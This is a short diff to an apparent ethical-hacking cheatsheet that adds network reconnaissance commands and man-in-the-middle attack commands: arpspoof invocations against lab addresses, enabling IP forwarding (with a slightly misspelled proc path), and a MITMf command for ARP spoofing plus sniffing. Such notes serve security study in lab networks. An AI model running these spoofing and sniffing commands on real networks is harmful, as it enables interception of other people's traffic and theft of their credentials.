@@ -11,5 +11,8 @@ This is a cheatsheet for commands and tools commonly used for ethical hacking.
 
 6) Reconnaissance  : a) netdiscover -r 10.0.2.1/24 b) nmap / zenmap(GUI)
 
-7)
+MITM:
+7) ARP Spoof: a) arpspoof -i ath0 -t 10.0.2.9 10.0.2.1 b) arpspoof -i ath0 -t 10.0.2.1 10.0.2.9 c) echo "1" > /proc/sys/net/ipv4/ip_forwarding
+
+8)MITMF     : a) mitmf --arp --spoof --gateway 10.0.2.1 --target 10.0.2.9 -i ath0   --- this command is arp spoof + sniffing
        
